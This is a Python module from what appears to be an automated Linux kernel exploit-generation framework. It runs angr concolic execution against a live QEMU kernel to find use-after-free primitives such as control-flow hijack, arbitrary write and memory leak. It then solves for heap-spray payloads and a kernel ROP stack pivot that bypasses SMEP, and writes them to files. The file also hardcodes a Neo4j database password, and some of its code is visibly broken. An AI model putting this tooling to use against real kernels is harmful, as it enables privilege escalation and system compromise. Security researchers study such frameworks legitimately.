import angr
from angr import concretization_strategies
import claripy
from pwn import *
import pickle
import colorama
import sys
import traceback
sys.path.append('/home/seed/fuze/statebroker')
import statebroker
sys.path.append('/home/seed/fuze/neo4j_interface')
sys.path.append('/home/seed/fuze/concolicexecutor')
sys.path.append('/home/seed/fuze/kernelrop')
import kernelrop
from . import _explore_routine
from . import _explore_impl
from . import _stats_explore
from . import _instrumentations
from . import _debugging_util
from . import _bp_handler
from . import _smep_bypass
from . import _payload_packer
from . import _houses_on_the_heap
from . import _exploit_knowledge_graph
import neo4j
import neo4j_interface

kernel_io_funcs = ['__put_user_4']



class ConcolicExecutor():
    def __init__(self, kernel_path='/home/seed/linux/linux/vmlinux', dbcred=\
            '/home/seed/fuze/neo4j_interface/alaka.bin'):
      
        self.kernel_path = kernel_path
        self.k = ELF(kernel_path)
        self.b = angr.Project(kernel_path)
        self.sol = claripy.Solver()
        self.claripy = claripy
        self.typebv = claripy.ast.bv.BV
        self.r = None
        self.statebroker = statebroker.StateBroker()
        self.krop = None
        self.interested_funcs = {}
        self.memory_leak_funcs = {}

        # build connection to knowledge graph
        #load = pickle.load(dbcred)
        #print((load['url'], load['username'],load['password']))
        load ={'url':"neo4j://192.168.92.1:7687", 'username':'neo4j', 'password':'Fuzzing775'}
        '''
        try:
            self.neo4j_inst = neo4j_interface.MyNeo4jInterface(load['url'], load['username'], load['password'])
        except neo4j.exceptions.ServiceUnavailable:
            print ('[-] could not connect database')
        '''
        # primitives
        self.control_flow_hijack_primitive = []  # control flow hijack primitive
        self.write_to_uaf_object_primitive = []  # write to uaf object primitive
        self.write_to_symbolic_address_primitive = []  # write to symbolic address primitive
        self.double_neo4j_instfree_primitive = []  # double free primitive
        self.memory_leak_primitive = []  # memory leak primitive

        self.seen_symbolic_write_primitive_addr = []
        self.seen_write_to_uaf_object_primitive_addr = []

        # attributes
        self.start_addr = None
        self.use_custom_concretization_strategy_first = None
        self.qemu_port = None
        self.debug_qemu_backend = None
        self.debug_irsb = None
        self.debug_after_address_concretization = None
        self.resolve_uninit = None
        self.pause_on_finish_memory_loading = None
        self.pause_on_write_to_symbolic_address = None
        self.pause_on_uninit_write = None
        self.pause_on_each_step = None
        self.pause_on_read_from_symbolic_address = None
        self.pause_on_write_to_uaf_object_primitive = None
        self.dump_uaf_buffer = None
        self.dump_userspace_buffer = None
        self.pause_on_failed_memory_resolving = None
        self.pause_on_control_flow_hijack = None
        self.pause_on_memory_leak = None
        self.remove_range_concretize = None
        self.userspace_base = None
        self.kuafffp_concretizer = None

        self.seen_control_flow_hijack_primitive = []
        self.seen_memory_leak_primitive = []

        self.concretization_range = None
        self.extra_bp = None
        self.execution_time_limit = None
        self.expected_start_rip = None
        self.limit_loop = None
        self.detect_rcu_free = None
        self.detect_memory_leak = None
        self.assigned_start_time = None
        self.start_time_of_symbolic_execution = None
        self.function_call_to_disable = None
        self.stack_pivot_address = None
        self.additional_symbolic_registers = None
        self.name_concretization_strategy = None
        self.num_user_pages = None
        self.spray_method = None
        self.pause_on_strange_state = None
        self.target_allocator = None
        self.vulnerability_type = None
        self.look_for_second_control_flow_hijack = None
    
    def setup(self, start_addr=None
              , vulnerability_type='uaf'
              , use_custom_concretization_strategy_first=True
              , qemu_port=7878
              , debug_irsb=False
              , debug_qemu_backend=True
              , debug_after_address_concretization=False
              , resolve_uninit=True
              , pause_on_finish_memory_loading=False
              , pause_on_write_to_symbolic_address=True
              , pause_on_uninit_write=True
              , pause_on_each_step=False
              , pause_on_read_from_symbolic_address=False
              , dump_uaf_buffer=True
              , dump_userspace_buffer=True
              , pause_on_failed_memory_resolving=False
              , concretization_range=1024
              , pause_on_write_to_uaf_object_primitive=True
              , pause_on_control_flow_hijack=True
              , pause_on_memory_leak=True
              , extra_bp=[]
              , execution_time_limit=60*30
              , expected_start_rip=None
              , limit_loop=True
              , detect_rcu_free=False
              , detect_memory_leak=True
              , callback_functions_to_monitor=None
              , assigned_start_time=None
              , function_call_to_disable=None
              , additional_symbolic_registers=[]
              , userspace_base=0xfacea000
              , name_concretization_strategy='kuafffp'
              , num_user_pages=1
              , spray_method='add_key'
              , pause_on_strange_state=True
              , target_allocator='slub'
              , look_for_second_control_flow_hijack=True
              ):
        self.start_addr = start_addr
        self.use_custom_concretization_strategy_first = use_custom_concretization_strategy_first
        self.qemu_port = qemu_port
        self.debug_qemu_backend = debug_qemu_backend
        self.debug_irsb = debug_irsb
        self.debug_after_address_concretization = debug_after_address_concretization
        self.resolve_uninit = resolve_uninit
        self.pause_on_finish_memory_loading = pause_on_finish_memory_loading
        self.pause_on_write_to_symbolic_address = pause_on_write_to_symbolic_address
        self.pause_on_uninit_write = pause_on_uninit_write
        self.pause_on_each_step = pause_on_each_step
        self.pause_on_read_from_symbolic_address = pause_on_read_from_symbolic_address
        self.pause_on_write_to_uaf_object_primitive = pause_on_write_to_uaf_object_primitive
        self.dump_uaf_buffer = dump_uaf_buffer
        self.dump_userspace_buffer = dump_userspace_buffer
        self.pause_on_failed_memory_resolving = pause_on_failed_memory_resolving
        self.pause_on_control_flow_hijack = pause_on_control_flow_hijack
        self.pause_on_memory_leak = pause_on_memory_leak
        self.remove_range_concretize = False
        self.userspace_base = userspace_base
        self.kuafffp_concretizer=concretization_strategies.SimConcretizationStrategyKuafffp(userspace_base, 4096)
        self.name_concretization_strategy = name_concretization_strategy

        self.seen_control_flow_hijack_primitive = []
        self.seen_memory_leak_primitive = []
        
        self.concretization_range = concretization_range
        self.extra_bp = extra_bp
        self.execution_time_limit = execution_time_limit
        self.expected_start_rip = expected_start_rip
        self.limit_loop=limit_loop
        self.detect_rcu_free = detect_rcu_free
        self.detect_memory_leak = detect_memory_leak
        self.assigned_start_time = assigned_start_time
        self.start_time_of_symbolic_execution = 0
        self.function_call_to_disable = function_call_to_disable
        self.additional_symbolic_registers = additional_symbolic_registers
        self.num_user_pages = num_user_pages
        self.spray_method = spray_method
        self.target_allocator = target_allocator
        self.vulnerability_type = vulnerability_type
        self.look_for_second_control_flow_hijack = look_for_second_control_flow_hijack

        self.pause_on_strange_state = pause_on_strange_state
  
        if callback_functions_to_monitor is not None:
            for name in callback_functions_to_monitor:
                print(('[+] need to monitor:', name, 'for primitive'))
                self.interested_funcs[name] = self.k.symbols[name]

        if self.detect_memory_leak:  # detect memory disclosure primitive
            for name in kernel_io_funcs:
                self.memory_leak_funcs[name] = self.k.symbols[name]

        return
   #_explore_rountine
    def run(self, uaf_object_base = None, uaf_object_size=0
            , do_rop=False, switch_cpu=False, register_storing_ip='eax', add_opts={}, remove_opts={}):

        self.uaf_object_base = uaf_object_base
        self.uaf_object_size = uaf_object_size

        if do_rop:  # if we choose rop to bypass SMEP
            self.stack_pivot_address = self.prepare_krop_payload(register_storing_ip=register_storing_ip)

        extras = {angr.options.REVERSE_MEMORY_NAME_MAP,
                  angr.options.TRACK_ACTION_HISTORY,
                  angr.options.CONSERVATIVE_READ_STRATEGY,
                  angr.options.KEEP_IP_SYMBOLIC,
                  angr.options.CONSTRAINT_TRACKING_IN_SOLVER}

        for opt in add_opts:
            extras.add(opt)

        for opt in remove_opts:
            extras.remove(opt)

        def do_nothing(state):
            pass

        if self.function_call_to_disable is not None:
            for addr in self.function_call_to_disable:
                if type(addr) in [int,int]:
                    self.b.hook(addr, do_nothing, 5)
                elif type(addr) in [str]:
                    func_addr = self.k.symbols[addr]
                    self.b.hook(addr, do_nothing, 5)  # todo: should set bp at call site instead of func
                else:
                    assert 0

        s = self.b.factory.blank_state(addr=self.start_addr, add_options=extras)

        if self.concretization_range != 1024:
            s.memory.read_strategies[0]._limit = self.concretization_range

        if self.remove_range_concretize:
            s.memory.read_strategies = []
            #s.memory.write_strategies=[]

        if self.use_custom_concretization_strategy_first :
            self.add_concretization_strategy(s, self.name_concretization_strategy)

        self.add_instrumentation(s)

        s = self.get_initial_state(s, switch_cpu)

        # prepare symbolic memory
        print('[+] setting memory at', hex(self.uaf_object_base), 'of length', self.uaf_object_size, 'to symbolic value')
        self.uaf_bytes = []
        for i in range(self.uaf_object_size):
            symbolic_byte = s.se.BVS("uaf_obj"+str(i), 8)
            self.uaf_bytes.append(symbolic_byte)
            s.memory.store(self.uaf_object_base + i, symbolic_byte, inspect=False)

        # prepare symbolic registers
        if len(self.additional_symbolic_registers) > 0:
            for reg in self.additional_symbolic_registers:
                new_val = s.se.BVS("my"+reg, 64)
                s.registers.store(reg, new_val)

        self.debug_state(s)

        self.explore_by_pathgroup(s)
        self.dump_all_primitives()
        #import IPython; IPython.embed()

        return

    def get_initial_state(self, s, switch_cpu=False):
        if self.debug_qemu_backend:
            self.r = remote('127.0.0.1', self.qemu_port)
            if switch_cpu:
                self.statebroker.set_cpu_number(self.r, 1)
            s = self.install_context(s)
            self.debug_state(s)
            if self.expected_start_rip is not None:
                if self.sol.eval(s.regs.rip, 1)[0] != self.expected_start_rip:
                    self.statebroker.set_cpu_number(self.r, 0)
            else:
                #opt = input('switch cpu?[N/y]')
                opt = 'n'
                print(opt)
                if 'y' in opt or 'Y' in opt:
                    self.statebroker.set_cpu_number(self.r, 0)
                    s = self.install_context(s)
                    self.debug_state(s)

            # getting start time of symbolic execution
            self.start_time_of_symbolic_execution = time.time()
            s = self.install_context(s)
            self.install_section(s, '.data')
            self.install_section(s, '.bss')
            self.install_section(s, '.brk')
            con = self.statebroker.get_a_page(self.r, self.uaf_object_base)  # install the page where the uaf object is
            self.set_concret_memory_region(s, self.uaf_object_base & 0xfffffffffffff000, con, 4096)
            con = self.statebroker.get_a_page(self.r, self.uaf_object_base + self.uaf_object_size)
            self.set_concret_memory_region(s, (self.uaf_object_base + self.uaf_object_size) & 0xfffffffffffff000, con, 4096)
            self.r.close()
        return s

        #_smep_bypass
    def add_stack_pivot_constraint(self, state):
        if self.stack_pivot_address is None:
            print('[-] no rop available')

        print('[+] checking the possibilities of stack pivot...')
        s = state.copy()
        primitive = {'state': s, 'timestamp': time.time(), 'address': s.history.bbl_addrs[-1]}
        if s.history.bbl_addrs[-1] not in self.seen_control_flow_hijack_primitive:
            self.seen_control_flow_hijack_primitive.append(s.history.bbl_addrs[-1])
            self.control_flow_hijack_primitive.append(primitive)  # add current state to CF hijack primitive
            is_new_primitive = True
        else:
            is_new_primitive = False
        # s.add_constraints(s.regs.rip == 0xdeadbeeffacefbad)
        s.add_constraints(s.regs.rip == self.stack_pivot_address)
        print(s.solver.constraints)
        self.dump_state_path_history(s)
        for _ in s.actions:
            print(_)
        if s.satisfiable() and is_new_primitive:
            # concretize uaf_bytes
            spray_content = ''
            for symbolic_byte in self.uaf_bytes:
                spray_content += s.solver.eval(symbolic_byte, cast_to=str)
            if self.dump_uaf_buffer:
                with open('uaf_object_v2.bin', 'w') as file:
                    file.write(spray_content)

            uaf_buf = s.memory.load(self.uaf_object_base, self.uaf_object_size, inspect=False)
            userspace_buf = s.memory.load(self.userspace_base, 4096 * self.num_user_pages, inspect=False)
            con1 = s.solver.eval(uaf_buf, cast_to=str)
            # generate spray function
            self.pack_spray_payload(con1, self.spray_method)  # generate spray payload
            print('the UAF object:', con1.encode('hex'))
            if self.dump_uaf_buffer:
                with open('uaf_object.bin', 'w') as file:
                    file.write(con1)
                print('[+] uaf object dumped to file')
            con2 = s.solver.eval(userspace_buf, cast_to=str)
            code, idx = self.pack_userspace_base_payload(con2)  # generate userspace base payload
            print('the userspace_buf:', con2.encode('hex'))
            if self.dump_userspace_buffer:
                with open('userspace_buffer.bin', 'w') as file:
                    file.write(con2)
                print('[+] userspace buffer dumped to file.')
            if idx != -1:
                path_log = 'path_log_'+str(idx)+'.txt'
            else:
                path_log = 'path_log.txt'
            with open(path_log, 'w') as f:
                for _ in s.history_iterator:
                    f.write(str(_))
                    f.write('\n')
        return s

    def prepare_krop_payload(self, cmd=None, register_storing_ip='eax'):
        if not os.path.isfile('rop_payload.cache'):  # have not generate rop payload
            if cmd is None:
                cmd = ('--binary ' + self.kernel_path + ' --depth 5').split()
            self.krop = kernelrop.KernelROP(self.kernel_path, cmd)
            print('[+] calculating kernel ROP payload, it may take up to 5 minutes')
            selected_gadget_idx, c_code, core = self.krop.routine1_to_c_code(register_storing_ip=register_storing_ip)
            stack_pivot_addr = self.krop.stack_pivot_gadgets_ready_to_use[selected_gadget_idx]['stack_addr']
            res = [c_code, stack_pivot_addr, selected_gadget_idx]
            with open('rop_payload.cache', 'wb') as f:
                pickle.dump(res, f, -1)
        else:
            with open('rop_payload.cache', 'rb') as f:
                res = pickle.load(f)
                c_code = res[0]
                stack_pivot_addr = res[1]
                selected_gadget_idx = res[2]
        print('writing rop payload to file')
        with('rop_payload.c', 'w') as file:
            file.write(c_code)
        print('stack_pivot_addr:', hex(stack_pivot_addr))

        return stack_pivot_addr
    #bp
    def track_symbolic_variable(self, state):
        print('Symbolic_Variable:', state.inspect.symbolic_name, 'size:', \
                state.inspect.symbolic_size, 'symbolic expr:', \
                state.inspect.symbolic_expr)
        return

    def track_bp(self, state):
        self.debug_state(state)
        #import IPython; IPython.embed()
        return


    def track_reads(self, state):
        if state.regs.rip.symbolic:  # we do not handle read when rip is symbolic
            return
        b = self.b
        sol = self.sol
        print('='*78)
        print('Read', state.inspect.mem_read_expr, 'from', state.inspect.mem_read_address,\
            'Size', state.inspect.mem_read_length)
        if type(state.inspect.mem_read_address) is not int:
            try:
                if self.debug_irsb:
                    irsb = b.factory.block(state.addr).vex
                    irsb.pp()
                cap = b.factory.block(state.addr).capstone
                cap.pp()
                self.dump_reg(state)
                print('uninit:', state.inspect.mem_read_address.uninitialized,\
                    'symbolic:', state.inspect.mem_read_address.symbolic)
                if state.inspect.mem_read_address.symbolic:
                    print('read from symbolic address, primitive found!')
                    if self.pause_on_read_from_symbolic_address:
                        print('wtf read from symbolic address')
                    return
                print('checking whether memory is uninitialized...')
                t=state.memory.load(state.inspect.mem_read_address,size=1,inspect=False)
                if (t.uninitialized and not state.inspect.mem_read_address.symbolic):
                    print('memory content uninit: ', t.uninitialized,\
                        'memory content symbolic: ', t.symbolic)
                    print('[+] uninitialized memory read found:', state.inspect.mem_read_address)
                    print('[+] the uninitialized memory read is at:', hex(state.addr))
                    if self.resolve_uninit:
                        r = remote('127.0.0.1', self.qemu_port)
                        addr = self.sol.eval(state.inspect.mem_read_address.get_bytes(0,8),1)[0]
                        print('[+] resolving a page containing the address:', hex(addr))
                        con = self.statebroker.get_a_page(r, addr)
                        r.close()
                        if con != None:
                            self.set_concret_memory_region(state, addr, con, 4096)
                            print('[+] resolved the uninit with concrete page')
                        else:
                            print( '[!] failed to resolve the uninit memory')
                            if self.pause_on_failed_memory_resolving:
                                #import IPython; IPython.embed()
                                pass
                        #import IPython; IPython.embed()
                        if self.pause_on_finish_memory_loading:
                            print('do the read now(continue) <-')
                else:
                    print('Memory Content does not appear uninitialized.')
            except AttributeError as e:
                print(e.args, e.message)
                print('wtf track reads')
                #import IPython; IPython.embed()
                pass
            except angr.errors.SimValueError as e:
                print('wtf simvalueerror')
                #import IPython; IPython.embed()

        else:
            #import IPython; IPython.embed()
            pass
        return

    def track_writes(self, state):
        b=self.b
        claripy = self.claripy
        print('='*78)
        print('Write', state.inspect.mem_write_expr, 'to', state.inspect.mem_write_address,\
            'size', state.inspect.mem_write_length,\
            'Write target type:', type(state.inspect.mem_write_address))
        if self.debug_irsb:
            irsb = b.factory.block(state.addr).vex
            irsb.pp()
        cap = b.factory.block(state.addr).capstone
        cap.pp()
        self.dump_reg(state)
        #if type(state.inspect.mem_write_address) not in [long, self.typebv]:
        if type(state.inspect.mem_write_address) not in [int]\
                and state.inspect.mem_write_address.symbolic:
            print('symbolic write?')
            try:
                print('target uninit:',state.inspect.mem_write_address.uninitialized,\
                    'target symbolic',state.inspect.mem_write_address.symbolic)
                if state.inspect.mem_write_address.symbolic:
                    print('[+] write to symbolic address, primitive found!')
                    if state.addr not in self.seen_symbolic_write_primitive_addr:
                        self.seen_symbolic_write_primitive_addr.append(state.addr)
                        s=state.copy()
                        self.write_to_symbolic_address_primitive.append(\
                            {'state':s\
                            ,'timestamp':time.time()\
                            })

                    if self.pause_on_write_to_symbolic_address:
                        #opt=input('ipython shell? [y/n]')
                        opt='n'
                        if opt=='y\n':
                            #import IPython; IPython.embed()
                            pass
                if state.inspect.mem_write_address.uninitialized:
                    print('write to uninitialized address, primitive found!')
                    if self.pause_on_uninit_write:
                        print('wtf uninitialzed write')
            except AttributeError as e:
                print(e.args, e.message)
                print('wtf track writes')
                #import IPython; IPython.embed()
                pass
            print('end symbolic write')
        else:
            print('normal write...')
            write_address = self.sol.eval(state.inspect.mem_write_address, 1)[0]
            if (write_address >= self.uaf_object_base)\
                    and (write_address <= self.uaf_object_base + self.uaf_object_size):
                print('uaf_object_base', hex(self.uaf_object_base))
                print((colorama.Fore.RED + '[+] found an write_to_uaf_object primitive' + colorama.Style.RESET_ALL))
                if state.addr not in self.seen_write_to_uaf_object_primitive_addr:
                    self.seen_write_to_uaf_object_primitive_addr.append(state.addr)
                    s = state.copy()
                    new_write_to_uaf_primitive={'state': s
                            , 'in_object_offset_to_write': state.inspect.mem_write_address - self.uaf_object_base
                            , 'expr_to_write': state.inspect.mem_write_expr
                            , 'address_to_write': state.inspect.mem_write_address
                            , 'size_to_write': state.inspect.mem_write_length
                            , 'timestamp': time.time()
                            }
                    self.write_to_uaf_object_primitive.append(new_write_to_uaf_primitive)
                    # try heap meta exploit
                    self.try_heap_metadata_exploit(self.write_to_uaf_object_primitive[-1])
                if self.pause_on_write_to_uaf_object_primitive:
                    #opt=input('ipython shell? [y/n]')
                    opt = 'n'
                    if opt == 'y\n':
                        #import IPython; IPython.embed()
                        pass
            print('end normal write...')
        #import IPython; IPython.embed()
        return

    def track_call_bk(self, state):
        """
        in this callback, we can not use state.addr to get current ip as it might be symbolic,
        if the rip is symbolic, we have found an exploitable primitive
        """
        print(('='*78))
        print(('Call instruction at:', state.inspect.function_address))
        if state.regs.rip.symbolic:  # found symbolic instruction pointer
            print((colorama.Fore.RED + '[+] control flow hijack found' + colorama.Style.RESET_ALL))
            self.add_stack_pivot_constraint(state)
            if self.pause_on_control_flow_hijack:
                #opt = input('ipython shell? [y/N]')
                opt='n'
                if opt == 'y\n':
                    #import IPython; IPython.embed()
                    pass
        else:
            # detecting other control hijack primitives
            print('rip', state.regs.rip)
            if self.detect_rcu_free and self.interested_funcs != {}:
                rcu_free = self.interested_funcs['kfree_call_rcu']
                if self.sol.eval(state.regs.rip,1)[0]==rcu_free and state.regs.rdi.symbolic:
                    print((colorama.Fore.RED + '[+] symbolic rcu_free found' + colorama.Style.RESET_ALL))
                    primitive = {'state':state.copy(), 'timestamp':time.time(),'address':state.history.bbl_addrs[-1]}
                    if state.history.bbl_addrs[-1] not in self.seen_control_flow_hijack_primitive:
                        self.seen_control_flow_hijack_primitive.append(state.history.bbl_addrs[-1])
                        self.control_flow_hijack_primitive.append(primitive)#add current state to CF hijack primitve

            # detecting memory leak
            if self.detect_memory_leak and len(self.memory_leak_funcs) != 0:
                for key in self.memory_leak_funcs:
                    value = self.memory_leak_funcs[key]
                    if self.sol.eval(state.regs.rip,1)[0] == value and state.regs.rax.symbolic:
                        print((colorama.Fore.RED + '[+] memory leak found' + colorama.Style.RESET_ALL))
                        primitive = {'state':state.copy(), 'timestamp':time.time(),'address':state.history.bbl_addrs[-1]}
                        if state.history.bbl_addrs[-1] not in self.seen_memory_leak_primitive:
                            self.seen_memory_leak_primitive.append(state.history.bbl_addrs[-1])
                            self.memory_leak_primitive.append(primitive)

        # raw_input('track_call')
        return

    def track_call(self, state):
        if not state.regs.rip.symbolic:
            print('rip', state.regs.rip)
            if self.detect_rcu_free and self.interested_funcs != {}:
                rcu_free = self.interested_funcs['kfree_call_rcu']
                if self.sol.eval(state.regs.rip,1)[0]==rcu_free and state.regs.rdi.symbolic:
                    print((colorama.Fore.RED + '[+] symbolic rcu_free found' + colorama.Style.RESET_ALL))
                    primitive = {'state':state.copy(), 'timestamp':time.time(),'address':state.history.bbl_addrs[-1]}
                    if state.history.bbl_addrs[-1] not in self.seen_control_flow_hijack_primitive:
                        self.seen_control_flow_hijack_primitive.append(state.history.bbl_addrs[-1])
                        self.control_flow_hijack_primitive.append(primitive)#add current state to CF hijack primitve

            # detecting memory leak
            if self.detect_memory_leak and len(self.memory_leak_funcs) != 0:
                for key in self.memory_leak_funcs:
                    value = self.memory_leak_funcs[key]
                    if self.sol.eval(state.regs.rip,1)[0] == value and state.regs.rax.symbolic:
                        print((colorama.Fore.RED + '[+] memory leak found' + colorama.Style.RESET_ALL))
                        primitive = {'state':state.copy(), 'timestamp':time.time(),'address':state.history.bbl_addrs[-1]}
                        if state.history.bbl_addrs[-1] not in self.seen_memory_leak_primitive:
                            self.seen_memory_leak_primitive.append(state.history.bbl_addrs[-1])
                            self.memory_leak_primitive.append(primitive)



    def address_concretization_before(self, state):
        print(('=' * 5 + 'Before concretizing address' + '=' * 5))
        print('state.addr', hex(state.addr))
        print('Address_Concretization strategy:', \
            state.inspect.address_concretization_strategy)
        print('Address concretization action:', \
            state.inspect.address_concretization_action)
        print('address_concretization_memory:', \
            state.inspect.address_concretization_memory)
        print('address_concretization_expr:', \
            state.inspect.address_concretization_expr)
        return

    def address_concretization_after(self, state):
        print('=====After address concretization=====')
        print('address_concretization_result:', \
            state.inspect.address_concretization_result)
        if state.inspect.address_concretization_action == 'load':
            print('address_concretization_action: load')
        print('=====End of concretization=====')
        if self.debug_after_address_concretization:
            #opt = input('ipython shell? [y/N]')
            opt='n'
            if opt == 'y\n':
                #import IPython;
                #IPython.embed()
                pass

    def concretization_cond(self, state):
        return state.addr == 0xffffffff8109a62a

    def concretization_cond_15649(self, state):
        return state.addr == 0xffffffff81788a57

    def concretization_cond_0728(self, state):
        return state.addr == 0xffffffff812d86ae  # <key_revoke+30>:   mov    rax,QWORD PTR [rbx+0x80]

    def concretize_call_before(self, state):
        print(('=' * 78))
        print(('Address_Concretization strategy:', \
              state.inspect.address_concretization_strategy))
        print(('Address_Concretization action:', \
              state.inspect.address_concretization_action))
        print(('Address_Concretization memory:', \
              state.inspect.address_concretization_memory))
        print(('Address_Concretization expr:', \
              state.inspect.address_concretization_expr))
        # raw_input()
        return

    def concretize_call_after(self, state):
        print(('=' * 78))
        print(('Address_Concretization strategy:', \
              state.inspect.address_concretization_strategy))
        print(('address_concretization_result:', \
              state.inspect.address_concretization_result))
        if state.inspect.address_concretization_action == 'load':
            print ('address_concretization_action: load')
        #opt = input('ipython shell? [y/N]')
        opt='n'
        if opt == 'y\n':
            #import IPython;
            #IPython.embed()
            pass
        return

    #concolde state
    def init_reg_concrete(self, s):
        # assert self.r != None
        s.regs.rax = s.se.BVV(self.statebroker.get_register(self.r, "rax"), 64)
        s.regs.rbx = s.se.BVV(self.statebroker.get_register(self.r, "rbx"), 64)
        s.regs.rcx = s.se.BVV(self.statebroker.get_register(self.r, "rcx"), 64)
        s.regs.rdx = s.se.BVV(self.statebroker.get_register(self.r, "rdx"), 64)
        s.regs.rsi = s.se.BVV(self.statebroker.get_register(self.r, "rsi"), 64)
        s.regs.rdi = s.se.BVV(self.statebroker.get_register(self.r, "rdi"), 64)
        s.regs.rsp = s.se.BVV(self.statebroker.get_register(self.r, "rsp"), 64)
        s.regs.rbp = s.se.BVV(self.statebroker.get_register(self.r, "rbp"), 64)
        s.regs.r8 = s.se.BVV(self.statebroker.get_register(self.r, "r8"), 64)
        s.regs.r9 = s.se.BVV(self.statebroker.get_register(self.r, "r9"), 64)
        s.regs.r10 = s.se.BVV(self.statebroker.get_register(self.r, "r10"), 64)
        s.regs.r11 = s.se.BVV(self.statebroker.get_register(self.r, "r11"), 64)
        s.regs.r12 = s.se.BVV(self.statebroker.get_register(self.r, "r12"), 64)
        s.regs.r13 = s.se.BVV(self.statebroker.get_register(self.r, "r13"), 64)
        s.regs.r14 = s.se.BVV(self.statebroker.get_register(self.r, "r14"), 64)
        s.regs.r15 = s.se.BVV(self.statebroker.get_register(self.r, "r15"), 64)
        s.regs.rip = s.se.BVV(self.statebroker.get_register(self.r, "rip"), 64)
        # s.regs.fs = s.se.BVV(self.statebroker.get_register(self.r,"fs"), 64)
        s.regs.gs = s.se.BVV(self.statebroker.get_register(self.r, "gs"), 64)
        # s.regs.es = s.se.BVV(self.statebroker.get_register(self.r,"es"), 16)
        # s.regs.cs = s.se.BVV(self.statebroker.get_register(self.r,"cs"), 16)
        # s.regs.ss = s.se.BVV(self.statebroker.get_register(self.r,"ss"), 16)
        # s.regs.ds = s.se.BVV(self.statebroker.get_register(self.r,"ds"), 16)
        return s

    def install_context(self, s):
        s = self.init_reg_concrete(s)
        return s

    def install_section(self, s, name):
        r = self.r
        k = self.k
        section = k.get_section_by_name(name)
        section_offset = section.header['sh_addr']
        section_length = section.header['sh_size']
        if section_length % 4096 != 0:
            section_length = ((section_length / 4096) + 1) * 4096
        num_of_page = section_length / 4096
        print('installing', num_of_page, 'pages of section:', name)
        for i in range(int(num_of_page)):
            # print i
            addr = section_offset + i * 4096
            con = self.statebroker.get_a_page(r, section_offset + i * 4096)
            if con is not None:
                self.set_concret_memory_region(s, addr, con, 4096)
            else:
                print('failed to get_a_page')
        print('Finished installing section:', name)
        return

    def set_concret_memory_region(self, s, addr, buf, length):
        aligned_addr = addr & 0xfffffffffffff000
        s.memory.store(aligned_addr, buf, inspect=False)
        return

    def add_instrumentations(self, s):
        return
    
    #debugger
    def debug_state(self, state):
        b = self.b
        try:
            print('-----start dump_state-----')
            self.dump_reg(state)
            irsb = b.factory.block(state.addr).vex
            cap = b.factory.block(state.addr).capstone
            irsb.pp()
            cap.pp()
            print('-----end dump_state-----')
        except angr.errors.SimEngineError:
            print('angr.errors.SimEngineError')
            pass
        except angr.errors.SimValueError:
            print('angr.errors.SimValueError:')
            #import IPython; IPython.embed()

    def debug_simgr(self, simgr):
        print('active:')
        for state in simgr.stashes['active']:
            self.debug_state(state)

    def dump_reg(self, state):
        print('rax:', state.regs.rax, 'r8', state.regs.r8)
        print('rbx:', state.regs.rbx, 'r9', state.regs.r9)
        print('rcx:', state.regs.rcx, 'r10', state.regs.r10)
        print('rdx:', state.regs.rdx, 'r11', state.regs.r11)
        print('rsi:', state.regs.rsi, 'r12', state.regs.r12)
        print('rdi:', state.regs.rdi, 'r13', state.regs.r13)
        print('rsp:', state.regs.rsp, 'r14', state.regs.r14)
        print('rbp:', state.regs.rbp, 'r15', state.regs.r15)
        print('gs:', state.regs.gs)
        return

    #exploit ackinowledge graph
    def select_auxiliary_object_pair_for_free_ptr_loop(self, object_size):
        # TODO query data base to get the pairs
        object_pair = None
        if object_size <= 16:
            object_pair = ['ccid', 'struct file_security_struct']
        return object_pair

    #explore emply
    def explore_by_pathgroup(self, s):
        sol = self.sol
        b = self.b
        simgr = b.factory.simgr(s, save_unconstrained=True)
        simgr.stashes['exploitable_state'] = []
        simgr.stashes['old_ucstate'] = []
        if self.limit_loop:
            llimiter = angr.exploration_techniques.LoopLimiter(count=5)
            simgr.use_technique(llimiter)
        loop_idx = 0
        while True:
            current_time = time.time()
            if current_time - self.start_time_of_symbolic_execution > self.execution_time_limit:
                print('[+] symbolic execution timeup, harvest now')
                self.dump_all_primitives()
                #import IPython; IPython.embed()
                return

            print('[+] '+str(loop_idx) + ' step()')
            self.debug_simgr(simgr)
            try:
                simgr.step(stash='active')
            except:
                print('wtf simgr error')
                traceback.print_exc()
                #import IPython; IPython.embed()
                return
            loop_idx += 1
            if len(simgr.active) == 0:
                print('no active states left, game over..')
                #import IPython; IPython.embed()
                return
            if simgr.unconstrained:
                for ucstate in simgr.unconstrained:
                    print('[+] unconstrained state found!')
                    print('Call instruction at:', ucstate.history)
                    print(colorama.Fore.RED + '[+] control flow hijack found' + colorama.Style.RESET_ALL)
                    # try stack pivot and rop to bypass SMEP
                    new_state = self.add_stack_pivot_constraint(ucstate)
                    if new_state is not None and new_state.satisfiable():
                        simgr.stashes['exploitable_state'].append(new_state)

                    if self.look_for_second_control_flow_hijack:
                        self.look_for_second_control_flow_hijack = False
                        # check for second control flow hijack by forking many states
                        affected_registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11'
                                              , 'r12', 'r13', 'r14', 'r15']
                        for affected_register in affected_registers:
                            try:
                                tmp_state = ucstate.copy()
                                old_value = tmp_state.registers.load(affected_register, 64, inspect=False)
                                if old_value.symbolic:  # do not fork if the old value is already symbolic
                                    continue
                                ret_addr = tmp_state.stack_pop()  # get the return address
                                tmp_state.regs.rip = ret_addr
                                new_reg_val = tmp_state.se.BVS('my'+affected_register, 64)
                                tmp_state.registers.store(affected_register, new_reg_val)
                                simgr.active.append(tmp_state)
                                print('volatile states added')
                            except:
                                traceback.print_exc()
                                #import IPython; IPython.embed()


                    if self.pause_on_control_flow_hijack:
                        #opt = input('ipython shell? [y/N]')
                        opt = 'n'
                        if opt == 'y\n':
                            #import IPython; IPython.embed()
                            pass
                    simgr.stashes['old_ucstate'].append(ucstate.copy())
                    simgr.unconstrained.remove(ucstate)


            if simgr.errored:
                print('[!] errored state found')
                #import IPython; IPython.embed()
                pass
            # inspect strange state that has rip not in kernel code space
            def my_filter_func(somestate):
                """
                helper function to filter meaningless states out
                :param somestate:
                :return:
                """
                if somestate.ip.symbolic:
                    return True
                ip = sol.eval(somestate.ip, 1)[0]
                if ip < 0xffffffff81000000:
                    return True
                if ip in [0xffff880066800000, 0]:
                    return True
                if ip < 0x7fffffffffff:
                    return True
                return False

            for state in simgr.active:
                if my_filter_func(state):
                    self.debug_state(state)
                    print('strange state, found...')
                    if self.pause_on_strange_state:
                        #import IPython; IPython.embed()
                        pass

            simgr.move(from_stash='active', to_stash='deadended', filter_func=my_filter_func)

